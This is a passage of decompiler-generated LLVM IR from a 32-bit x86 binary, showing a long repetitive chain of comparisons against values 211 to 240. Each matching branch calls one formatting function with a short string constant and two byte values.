  store i32 %v2_804c698, i32* @ebx, align 4
  %v5_804c69f = call i32 @function_8048b5b(i32 %v2_804c698, i32 ptrtoint ([13 x i8]* @global_var_805a9d0.252 to i32), i32 %v1_804c689, i32 %v1_804c67d)
  br label %dec_label_pc_804c6a7

dec_label_pc_804c6a7:                             ; preds = %dec_label_pc_804c674, %dec_label_pc_804c67d
  %v12_804c6a7 = icmp eq i32 %v11_8049e19, 211
  %v1_804c6ae = icmp eq i1 %v12_804c6a7, false
  br i1 %v1_804c6ae, label %dec_label_pc_804c6da, label %dec_label_pc_804c6b0

dec_label_pc_804c6b0:                             ; preds = %dec_label_pc_804c6a7
  %v0_804c6b0 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c6b0 = zext i8 %v0_804c6b0 to i32
  store i32 %v1_804c6b0, i32* @edx, align 4
  %v0_804c6bc = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c6bc = zext i8 %v0_804c6bc to i32
  %v2_804c6cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6cb, i32* @ebx, align 4
  %v5_804c6d2 = call i32 @function_8048b5b(i32 %v2_804c6cb, i32 ptrtoint ([12 x i8]* @global_var_805a9dd.253 to i32), i32 %v1_804c6bc, i32 %v1_804c6b0)
  br label %dec_label_pc_804c6da

dec_label_pc_804c6da:                             ; preds = %dec_label_pc_804c6a7, %dec_label_pc_804c6b0
  %v12_804c6da = icmp eq i32 %v11_8049e19, 212
  %v1_804c6e1 = icmp eq i1 %v12_804c6da, false
  br i1 %v1_804c6e1, label %dec_label_pc_804c70d, label %dec_label_pc_804c6e3

dec_label_pc_804c6e3:                             ; preds = %dec_label_pc_804c6da
  %v0_804c6e3 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c6e3 = zext i8 %v0_804c6e3 to i32
  store i32 %v1_804c6e3, i32* @edx, align 4
  %v0_804c6ef = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c6ef = zext i8 %v0_804c6ef to i32
  %v2_804c6fe = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6fe, i32* @ebx, align 4
  %v5_804c705 = call i32 @function_8048b5b(i32 %v2_804c6fe, i32 ptrtoint ([13 x i8]* @global_var_805a9e9.254 to i32), i32 %v1_804c6ef, i32 %v1_804c6e3)
  br label %dec_label_pc_804c70d

dec_label_pc_804c70d:                             ; preds = %dec_label_pc_804c6da, %dec_label_pc_804c6e3
  %v12_804c70d = icmp eq i32 %v11_8049e19, 213
  %v1_804c714 = icmp eq i1 %v12_804c70d, false
  br i1 %v1_804c714, label %dec_label_pc_804c740, label %dec_label_pc_804c716

dec_label_pc_804c716:                             ; preds = %dec_label_pc_804c70d
  %v0_804c716 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c716 = zext i8 %v0_804c716 to i32
  store i32 %v1_804c716, i32* @edx, align 4
  %v0_804c722 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c722 = zext i8 %v0_804c722 to i32
  %v2_804c731 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c731, i32* @ebx, align 4
  %v5_804c738 = call i32 @function_8048b5b(i32 %v2_804c731, i32 ptrtoint ([14 x i8]* @global_var_805a9f6.255 to i32), i32 %v1_804c722, i32 %v1_804c716)
  br label %dec_label_pc_804c740

dec_label_pc_804c740:                             ; preds = %dec_label_pc_804c70d, %dec_label_pc_804c716
  %v12_804c740 = icmp eq i32 %v11_8049e19, 214
  %v1_804c747 = icmp eq i1 %v12_804c740, false
  br i1 %v1_804c747, label %dec_label_pc_804c773, label %dec_label_pc_804c749

dec_label_pc_804c749:                             ; preds = %dec_label_pc_804c740
  %v0_804c749 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c749 = zext i8 %v0_804c749 to i32
  store i32 %v1_804c749, i32* @edx, align 4
  %v0_804c755 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c755 = zext i8 %v0_804c755 to i32
  %v2_804c764 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c764, i32* @ebx, align 4
  %v5_804c76b = call i32 @function_8048b5b(i32 %v2_804c764, i32 ptrtoint ([13 x i8]* @global_var_805aa04.256 to i32), i32 %v1_804c755, i32 %v1_804c749)
  br label %dec_label_pc_804c773

dec_label_pc_804c773:                             ; preds = %dec_label_pc_804c740, %dec_label_pc_804c749
  %v12_804c773 = icmp eq i32 %v11_8049e19, 215
  %v1_804c77a = icmp eq i1 %v12_804c773, false
  br i1 %v1_804c77a, label %dec_label_pc_804c7a6, label %dec_label_pc_804c77c

dec_label_pc_804c77c:                             ; preds = %dec_label_pc_804c773
  %v0_804c77c = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c77c = zext i8 %v0_804c77c to i32
  store i32 %v1_804c77c, i32* @edx, align 4
  %v0_804c788 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c788 = zext i8 %v0_804c788 to i32
  %v2_804c797 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c797, i32* @ebx, align 4
  %v5_804c79e = call i32 @function_8048b5b(i32 %v2_804c797, i32 ptrtoint ([13 x i8]* @global_var_805aa11.257 to i32), i32 %v1_804c788, i32 %v1_804c77c)
  br label %dec_label_pc_804c7a6

dec_label_pc_804c7a6:                             ; preds = %dec_label_pc_804c773, %dec_label_pc_804c77c
  %v12_804c7a6 = icmp eq i32 %v11_8049e19, 216
  %v1_804c7ad = icmp eq i1 %v12_804c7a6, false
  br i1 %v1_804c7ad, label %dec_label_pc_804c7d9, label %dec_label_pc_804c7af

dec_label_pc_804c7af:                             ; preds = %dec_label_pc_804c7a6
  %v0_804c7af = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c7af = zext i8 %v0_804c7af to i32
  store i32 %v1_804c7af, i32* @edx, align 4
  %v0_804c7bb = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c7bb = zext i8 %v0_804c7bb to i32
  %v2_804c7ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7ca, i32* @ebx, align 4
  %v5_804c7d1 = call i32 @function_8048b5b(i32 %v2_804c7ca, i32 ptrtoint ([13 x i8]* @global_var_805aa1e.258 to i32), i32 %v1_804c7bb, i32 %v1_804c7af)
  br label %dec_label_pc_804c7d9

dec_label_pc_804c7d9:                             ; preds = %dec_label_pc_804c7a6, %dec_label_pc_804c7af
  %v12_804c7d9 = icmp eq i32 %v11_8049e19, 217
  %v1_804c7e0 = icmp eq i1 %v12_804c7d9, false
  br i1 %v1_804c7e0, label %dec_label_pc_804c80c, label %dec_label_pc_804c7e2

dec_label_pc_804c7e2:                             ; preds = %dec_label_pc_804c7d9
  %v0_804c7e2 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c7e2 = zext i8 %v0_804c7e2 to i32
  store i32 %v1_804c7e2, i32* @edx, align 4
  %v0_804c7ee = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c7ee = zext i8 %v0_804c7ee to i32
  %v2_804c7fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7fd, i32* @ebx, align 4
  %v5_804c804 = call i32 @function_8048b5b(i32 %v2_804c7fd, i32 ptrtoint ([13 x i8]* @global_var_805aa2b.259 to i32), i32 %v1_804c7ee, i32 %v1_804c7e2)
  br label %dec_label_pc_804c80c

dec_label_pc_804c80c:                             ; preds = %dec_label_pc_804c7d9, %dec_label_pc_804c7e2
  %v12_804c80c = icmp eq i32 %v11_8049e19, 218
  %v1_804c813 = icmp eq i1 %v12_804c80c, false
  br i1 %v1_804c813, label %dec_label_pc_804c83f, label %dec_label_pc_804c815

dec_label_pc_804c815:                             ; preds = %dec_label_pc_804c80c
  %v0_804c815 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c815 = zext i8 %v0_804c815 to i32
  store i32 %v1_804c815, i32* @edx, align 4
  %v0_804c821 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c821 = zext i8 %v0_804c821 to i32
  %v2_804c830 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c830, i32* @ebx, align 4
  %v5_804c837 = call i32 @function_8048b5b(i32 %v2_804c830, i32 ptrtoint ([13 x i8]* @global_var_805aa38.260 to i32), i32 %v1_804c821, i32 %v1_804c815)
  br label %dec_label_pc_804c83f

dec_label_pc_804c83f:                             ; preds = %dec_label_pc_804c80c, %dec_label_pc_804c815
  %v12_804c83f = icmp eq i32 %v11_8049e19, 219
  %v1_804c846 = icmp eq i1 %v12_804c83f, false
  br i1 %v1_804c846, label %dec_label_pc_804c872, label %dec_label_pc_804c848

dec_label_pc_804c848:                             ; preds = %dec_label_pc_804c83f
  %v0_804c848 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c848 = zext i8 %v0_804c848 to i32
  store i32 %v1_804c848, i32* @edx, align 4
  %v0_804c854 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c854 = zext i8 %v0_804c854 to i32
  %v2_804c863 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c863, i32* @ebx, align 4
  %v5_804c86a = call i32 @function_8048b5b(i32 %v2_804c863, i32 ptrtoint ([14 x i8]* @global_var_805aa45.261 to i32), i32 %v1_804c854, i32 %v1_804c848)
  br label %dec_label_pc_804c872

dec_label_pc_804c872:                             ; preds = %dec_label_pc_804c83f, %dec_label_pc_804c848
  %v12_804c872 = icmp eq i32 %v11_8049e19, 220
  %v1_804c879 = icmp eq i1 %v12_804c872, false
  br i1 %v1_804c879, label %dec_label_pc_804c8a5, label %dec_label_pc_804c87b

dec_label_pc_804c87b:                             ; preds = %dec_label_pc_804c872
  %v0_804c87b = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c87b = zext i8 %v0_804c87b to i32
  store i32 %v1_804c87b, i32* @edx, align 4
  %v0_804c887 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c887 = zext i8 %v0_804c887 to i32
  %v2_804c896 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c896, i32* @ebx, align 4
  %v5_804c89d = call i32 @function_8048b5b(i32 %v2_804c896, i32 ptrtoint ([14 x i8]* @global_var_805aa53.262 to i32), i32 %v1_804c887, i32 %v1_804c87b)
  br label %dec_label_pc_804c8a5

dec_label_pc_804c8a5:                             ; preds = %dec_label_pc_804c872, %dec_label_pc_804c87b
  %v12_804c8a5 = icmp eq i32 %v11_8049e19, 221
  %v1_804c8ac = icmp eq i1 %v12_804c8a5, false
  br i1 %v1_804c8ac, label %dec_label_pc_804c8d8, label %dec_label_pc_804c8ae

dec_label_pc_804c8ae:                             ; preds = %dec_label_pc_804c8a5
  %v0_804c8ae = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c8ae = zext i8 %v0_804c8ae to i32
  store i32 %v1_804c8ae, i32* @edx, align 4
  %v0_804c8ba = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c8ba = zext i8 %v0_804c8ba to i32
  %v2_804c8c9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8c9, i32* @ebx, align 4
  %v5_804c8d0 = call i32 @function_8048b5b(i32 %v2_804c8c9, i32 ptrtoint ([14 x i8]* @global_var_805aa61.263 to i32), i32 %v1_804c8ba, i32 %v1_804c8ae)
  br label %dec_label_pc_804c8d8

dec_label_pc_804c8d8:                             ; preds = %dec_label_pc_804c8a5, %dec_label_pc_804c8ae
  %v12_804c8d8 = icmp eq i32 %v11_8049e19, 222
  %v1_804c8df = icmp eq i1 %v12_804c8d8, false
  br i1 %v1_804c8df, label %dec_label_pc_804c90b, label %dec_label_pc_804c8e1

dec_label_pc_804c8e1:                             ; preds = %dec_label_pc_804c8d8
  %v0_804c8e1 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c8e1 = zext i8 %v0_804c8e1 to i32
  store i32 %v1_804c8e1, i32* @edx, align 4
  %v0_804c8ed = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c8ed = zext i8 %v0_804c8ed to i32
  %v2_804c8fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8fc, i32* @ebx, align 4
  %v5_804c903 = call i32 @function_8048b5b(i32 %v2_804c8fc, i32 ptrtoint ([14 x i8]* @global_var_805aa6f.264 to i32), i32 %v1_804c8ed, i32 %v1_804c8e1)
  br label %dec_label_pc_804c90b

dec_label_pc_804c90b:                             ; preds = %dec_label_pc_804c8d8, %dec_label_pc_804c8e1
  %v12_804c90b = icmp eq i32 %v11_8049e19, 223
  %v1_804c912 = icmp eq i1 %v12_804c90b, false
  br i1 %v1_804c912, label %dec_label_pc_804c93e, label %dec_label_pc_804c914

dec_label_pc_804c914:                             ; preds = %dec_label_pc_804c90b
  %v0_804c914 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c914 = zext i8 %v0_804c914 to i32
  store i32 %v1_804c914, i32* @edx, align 4
  %v0_804c920 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c920 = zext i8 %v0_804c920 to i32
  %v2_804c92f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c92f, i32* @ebx, align 4
  %v5_804c936 = call i32 @function_8048b5b(i32 %v2_804c92f, i32 ptrtoint ([14 x i8]* @global_var_805aa7d.265 to i32), i32 %v1_804c920, i32 %v1_804c914)
  br label %dec_label_pc_804c93e

dec_label_pc_804c93e:                             ; preds = %dec_label_pc_804c90b, %dec_label_pc_804c914
  %v9_804c93e = icmp eq i32 %v11_8049e19, 224
  %v1_804c945 = icmp eq i1 %v9_804c93e, false
  br i1 %v1_804c945, label %dec_label_pc_804c971, label %dec_label_pc_804c947

dec_label_pc_804c947:                             ; preds = %dec_label_pc_804c93e
  %v0_804c947 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c947 = zext i8 %v0_804c947 to i32
  store i32 %v1_804c947, i32* @edx, align 4
  %v0_804c953 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c953 = zext i8 %v0_804c953 to i32
  %v2_804c962 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c962, i32* @ebx, align 4
  %v5_804c969 = call i32 @function_8048b5b(i32 %v2_804c962, i32 ptrtoint ([14 x i8]* @global_var_805aa8b.266 to i32), i32 %v1_804c953, i32 %v1_804c947)
  br label %dec_label_pc_804c971

dec_label_pc_804c971:                             ; preds = %dec_label_pc_804c93e, %dec_label_pc_804c947
  %v12_804c971 = icmp eq i32 %v11_8049e19, 225
  %v1_804c978 = icmp eq i1 %v12_804c971, false
  br i1 %v1_804c978, label %dec_label_pc_804c9a4, label %dec_label_pc_804c97a

dec_label_pc_804c97a:                             ; preds = %dec_label_pc_804c971
  %v0_804c97a = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c97a = zext i8 %v0_804c97a to i32
  store i32 %v1_804c97a, i32* @edx, align 4
  %v0_804c986 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c986 = zext i8 %v0_804c986 to i32
  %v2_804c995 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c995, i32* @ebx, align 4
  %v5_804c99c = call i32 @function_8048b5b(i32 %v2_804c995, i32 ptrtoint ([13 x i8]* @global_var_805aa99.267 to i32), i32 %v1_804c986, i32 %v1_804c97a)
  br label %dec_label_pc_804c9a4

dec_label_pc_804c9a4:                             ; preds = %dec_label_pc_804c971, %dec_label_pc_804c97a
  %v12_804c9a4 = icmp eq i32 %v11_8049e19, 226
  %v1_804c9ab = icmp eq i1 %v12_804c9a4, false
  br i1 %v1_804c9ab, label %dec_label_pc_804c9d7, label %dec_label_pc_804c9ad

dec_label_pc_804c9ad:                             ; preds = %dec_label_pc_804c9a4
  %v0_804c9ad = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c9ad = zext i8 %v0_804c9ad to i32
  store i32 %v1_804c9ad, i32* @edx, align 4
  %v0_804c9b9 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c9b9 = zext i8 %v0_804c9b9 to i32
  %v2_804c9c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c9c8, i32* @ebx, align 4
  %v5_804c9cf = call i32 @function_8048b5b(i32 %v2_804c9c8, i32 ptrtoint ([13 x i8]* @global_var_805aaa6.268 to i32), i32 %v1_804c9b9, i32 %v1_804c9ad)
  br label %dec_label_pc_804c9d7

dec_label_pc_804c9d7:                             ; preds = %dec_label_pc_804c9a4, %dec_label_pc_804c9ad
  %v12_804c9d7 = icmp eq i32 %v11_8049e19, 227
  %v1_804c9de = icmp eq i1 %v12_804c9d7, false
  br i1 %v1_804c9de, label %dec_label_pc_804ca0a, label %dec_label_pc_804c9e0

dec_label_pc_804c9e0:                             ; preds = %dec_label_pc_804c9d7
  %v0_804c9e0 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804c9e0 = zext i8 %v0_804c9e0 to i32
  store i32 %v1_804c9e0, i32* @edx, align 4
  %v0_804c9ec = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804c9ec = zext i8 %v0_804c9ec to i32
  %v2_804c9fb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c9fb, i32* @ebx, align 4
  %v5_804ca02 = call i32 @function_8048b5b(i32 %v2_804c9fb, i32 ptrtoint ([14 x i8]* @global_var_805aab3.269 to i32), i32 %v1_804c9ec, i32 %v1_804c9e0)
  br label %dec_label_pc_804ca0a

dec_label_pc_804ca0a:                             ; preds = %dec_label_pc_804c9d7, %dec_label_pc_804c9e0
  %v12_804ca0a = icmp eq i32 %v11_8049e19, 228
  %v1_804ca11 = icmp eq i1 %v12_804ca0a, false
  br i1 %v1_804ca11, label %dec_label_pc_804ca3d, label %dec_label_pc_804ca13

dec_label_pc_804ca13:                             ; preds = %dec_label_pc_804ca0a
  %v0_804ca13 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ca13 = zext i8 %v0_804ca13 to i32
  store i32 %v1_804ca13, i32* @edx, align 4
  %v0_804ca1f = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ca1f = zext i8 %v0_804ca1f to i32
  %v2_804ca2e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca2e, i32* @ebx, align 4
  %v5_804ca35 = call i32 @function_8048b5b(i32 %v2_804ca2e, i32 ptrtoint ([14 x i8]* @global_var_805aac1.270 to i32), i32 %v1_804ca1f, i32 %v1_804ca13)
  br label %dec_label_pc_804ca3d

dec_label_pc_804ca3d:                             ; preds = %dec_label_pc_804ca0a, %dec_label_pc_804ca13
  %v12_804ca3d = icmp eq i32 %v11_8049e19, 229
  %v1_804ca44 = icmp eq i1 %v12_804ca3d, false
  br i1 %v1_804ca44, label %dec_label_pc_804ca70, label %dec_label_pc_804ca46

dec_label_pc_804ca46:                             ; preds = %dec_label_pc_804ca3d
  %v0_804ca46 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ca46 = zext i8 %v0_804ca46 to i32
  store i32 %v1_804ca46, i32* @edx, align 4
  %v0_804ca52 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ca52 = zext i8 %v0_804ca52 to i32
  %v2_804ca61 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca61, i32* @ebx, align 4
  %v5_804ca68 = call i32 @function_8048b5b(i32 %v2_804ca61, i32 ptrtoint ([14 x i8]* @global_var_805aacf.271 to i32), i32 %v1_804ca52, i32 %v1_804ca46)
  br label %dec_label_pc_804ca70

dec_label_pc_804ca70:                             ; preds = %dec_label_pc_804ca3d, %dec_label_pc_804ca46
  %v12_804ca70 = icmp eq i32 %v11_8049e19, 230
  %v1_804ca77 = icmp eq i1 %v12_804ca70, false
  br i1 %v1_804ca77, label %dec_label_pc_804caa3, label %dec_label_pc_804ca79

dec_label_pc_804ca79:                             ; preds = %dec_label_pc_804ca70
  %v0_804ca79 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804ca79 = zext i8 %v0_804ca79 to i32
  store i32 %v1_804ca79, i32* @edx, align 4
  %v0_804ca85 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804ca85 = zext i8 %v0_804ca85 to i32
  %v2_804ca94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ca94, i32* @ebx, align 4
  %v5_804ca9b = call i32 @function_8048b5b(i32 %v2_804ca94, i32 ptrtoint ([14 x i8]* @global_var_805aadd.272 to i32), i32 %v1_804ca85, i32 %v1_804ca79)
  br label %dec_label_pc_804caa3

dec_label_pc_804caa3:                             ; preds = %dec_label_pc_804ca70, %dec_label_pc_804ca79
  %v12_804caa3 = icmp eq i32 %v11_8049e19, 231
  %v1_804caaa = icmp eq i1 %v12_804caa3, false
  br i1 %v1_804caaa, label %dec_label_pc_804cad6, label %dec_label_pc_804caac

dec_label_pc_804caac:                             ; preds = %dec_label_pc_804caa3
  %v0_804caac = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804caac = zext i8 %v0_804caac to i32
  store i32 %v1_804caac, i32* @edx, align 4
  %v0_804cab8 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cab8 = zext i8 %v0_804cab8 to i32
  %v2_804cac7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cac7, i32* @ebx, align 4
  %v5_804cace = call i32 @function_8048b5b(i32 %v2_804cac7, i32 ptrtoint ([14 x i8]* @global_var_805aaeb.273 to i32), i32 %v1_804cab8, i32 %v1_804caac)
  br label %dec_label_pc_804cad6

dec_label_pc_804cad6:                             ; preds = %dec_label_pc_804caa3, %dec_label_pc_804caac
  %v12_804cad6 = icmp eq i32 %v11_8049e19, 232
  %v1_804cadd = icmp eq i1 %v12_804cad6, false
  br i1 %v1_804cadd, label %dec_label_pc_804cb09, label %dec_label_pc_804cadf

dec_label_pc_804cadf:                             ; preds = %dec_label_pc_804cad6
  %v0_804cadf = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cadf = zext i8 %v0_804cadf to i32
  store i32 %v1_804cadf, i32* @edx, align 4
  %v0_804caeb = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804caeb = zext i8 %v0_804caeb to i32
  %v2_804cafa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cafa, i32* @ebx, align 4
  %v5_804cb01 = call i32 @function_8048b5b(i32 %v2_804cafa, i32 ptrtoint ([14 x i8]* @global_var_805aaf9.274 to i32), i32 %v1_804caeb, i32 %v1_804cadf)
  br label %dec_label_pc_804cb09

dec_label_pc_804cb09:                             ; preds = %dec_label_pc_804cad6, %dec_label_pc_804cadf
  %v12_804cb09 = icmp eq i32 %v11_8049e19, 233
  %v1_804cb10 = icmp eq i1 %v12_804cb09, false
  br i1 %v1_804cb10, label %dec_label_pc_804cb3c, label %dec_label_pc_804cb12

dec_label_pc_804cb12:                             ; preds = %dec_label_pc_804cb09
  %v0_804cb12 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cb12 = zext i8 %v0_804cb12 to i32
  store i32 %v1_804cb12, i32* @edx, align 4
  %v0_804cb1e = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cb1e = zext i8 %v0_804cb1e to i32
  %v2_804cb2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb2d, i32* @ebx, align 4
  %v5_804cb34 = call i32 @function_8048b5b(i32 %v2_804cb2d, i32 ptrtoint ([14 x i8]* @global_var_805ab07.275 to i32), i32 %v1_804cb1e, i32 %v1_804cb12)
  br label %dec_label_pc_804cb3c

dec_label_pc_804cb3c:                             ; preds = %dec_label_pc_804cb09, %dec_label_pc_804cb12
  %v12_804cb3c = icmp eq i32 %v11_8049e19, 234
  %v1_804cb43 = icmp eq i1 %v12_804cb3c, false
  br i1 %v1_804cb43, label %dec_label_pc_804cb6f, label %dec_label_pc_804cb45

dec_label_pc_804cb45:                             ; preds = %dec_label_pc_804cb3c
  %v0_804cb45 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cb45 = zext i8 %v0_804cb45 to i32
  store i32 %v1_804cb45, i32* @edx, align 4
  %v0_804cb51 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cb51 = zext i8 %v0_804cb51 to i32
  %v2_804cb60 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb60, i32* @ebx, align 4
  %v5_804cb67 = call i32 @function_8048b5b(i32 %v2_804cb60, i32 ptrtoint ([14 x i8]* @global_var_805ab15.276 to i32), i32 %v1_804cb51, i32 %v1_804cb45)
  br label %dec_label_pc_804cb6f

dec_label_pc_804cb6f:                             ; preds = %dec_label_pc_804cb3c, %dec_label_pc_804cb45
  %v12_804cb6f = icmp eq i32 %v11_8049e19, 235
  %v1_804cb76 = icmp eq i1 %v12_804cb6f, false
  br i1 %v1_804cb76, label %dec_label_pc_804cba2, label %dec_label_pc_804cb78

dec_label_pc_804cb78:                             ; preds = %dec_label_pc_804cb6f
  %v0_804cb78 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cb78 = zext i8 %v0_804cb78 to i32
  store i32 %v1_804cb78, i32* @edx, align 4
  %v0_804cb84 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cb84 = zext i8 %v0_804cb84 to i32
  %v2_804cb93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cb93, i32* @ebx, align 4
  %v5_804cb9a = call i32 @function_8048b5b(i32 %v2_804cb93, i32 ptrtoint ([13 x i8]* @global_var_805ab23.277 to i32), i32 %v1_804cb84, i32 %v1_804cb78)
  br label %dec_label_pc_804cba2

dec_label_pc_804cba2:                             ; preds = %dec_label_pc_804cb6f, %dec_label_pc_804cb78
  %v12_804cba2 = icmp eq i32 %v11_8049e19, 236
  %v1_804cba9 = icmp eq i1 %v12_804cba2, false
  br i1 %v1_804cba9, label %dec_label_pc_804cbd5, label %dec_label_pc_804cbab

dec_label_pc_804cbab:                             ; preds = %dec_label_pc_804cba2
  %v0_804cbab = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cbab = zext i8 %v0_804cbab to i32
  store i32 %v1_804cbab, i32* @edx, align 4
  %v0_804cbb7 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cbb7 = zext i8 %v0_804cbb7 to i32
  %v2_804cbc6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cbc6, i32* @ebx, align 4
  %v5_804cbcd = call i32 @function_8048b5b(i32 %v2_804cbc6, i32 ptrtoint ([13 x i8]* @global_var_805ab30.278 to i32), i32 %v1_804cbb7, i32 %v1_804cbab)
  br label %dec_label_pc_804cbd5

dec_label_pc_804cbd5:                             ; preds = %dec_label_pc_804cba2, %dec_label_pc_804cbab
  %v12_804cbd5 = icmp eq i32 %v11_8049e19, 237
  %v1_804cbdc = icmp eq i1 %v12_804cbd5, false
  br i1 %v1_804cbdc, label %dec_label_pc_804cc08, label %dec_label_pc_804cbde

dec_label_pc_804cbde:                             ; preds = %dec_label_pc_804cbd5
  %v0_804cbde = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cbde = zext i8 %v0_804cbde to i32
  store i32 %v1_804cbde, i32* @edx, align 4
  %v0_804cbea = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cbea = zext i8 %v0_804cbea to i32
  %v2_804cbf9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cbf9, i32* @ebx, align 4
  %v5_804cc00 = call i32 @function_8048b5b(i32 %v2_804cbf9, i32 ptrtoint ([13 x i8]* @global_var_805ab3d.279 to i32), i32 %v1_804cbea, i32 %v1_804cbde)
  br label %dec_label_pc_804cc08

dec_label_pc_804cc08:                             ; preds = %dec_label_pc_804cbd5, %dec_label_pc_804cbde
  %v12_804cc08 = icmp eq i32 %v11_8049e19, 238
  %v1_804cc0f = icmp eq i1 %v12_804cc08, false
  br i1 %v1_804cc0f, label %dec_label_pc_804cc3b, label %dec_label_pc_804cc11

dec_label_pc_804cc11:                             ; preds = %dec_label_pc_804cc08
  %v0_804cc11 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cc11 = zext i8 %v0_804cc11 to i32
  store i32 %v1_804cc11, i32* @edx, align 4
  %v0_804cc1d = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cc1d = zext i8 %v0_804cc1d to i32
  %v2_804cc2c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cc2c, i32* @ebx, align 4
  %v5_804cc33 = call i32 @function_8048b5b(i32 %v2_804cc2c, i32 ptrtoint ([13 x i8]* @global_var_805ab4a.280 to i32), i32 %v1_804cc1d, i32 %v1_804cc11)
  br label %dec_label_pc_804cc3b

dec_label_pc_804cc3b:                             ; preds = %dec_label_pc_804cc08, %dec_label_pc_804cc11
  %v12_804cc3b = icmp eq i32 %v11_8049e19, 239
  %v1_804cc42 = icmp eq i1 %v12_804cc3b, false
  br i1 %v1_804cc42, label %dec_label_pc_804cc6e, label %dec_label_pc_804cc44

dec_label_pc_804cc44:                             ; preds = %dec_label_pc_804cc3b
  %v0_804cc44 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804cc44 = zext i8 %v0_804cc44 to i32
  store i32 %v1_804cc44, i32* @edx, align 4
  %v0_804cc50 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804cc50 = zext i8 %v0_804cc50 to i32
  %v2_804cc5f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804cc5f, i32* @ebx, align 4
  %v5_804cc66 = call i32 @function_8048b5b(i32 %v2_804cc5f, i32 ptrtoint ([13 x i8]* @global_var_805ab57.281 to i32), i32 %v1_804cc50, i32 %v1_804cc44)
  br label %dec_label_pc_804cc6e

dec_label_pc_804cc6e:                             ; preds = %dec_label_pc_804cc3b, %dec_label_pc_804cc44
  %v9_804cc6e = icmp eq i32 %v11_8049e19, 240
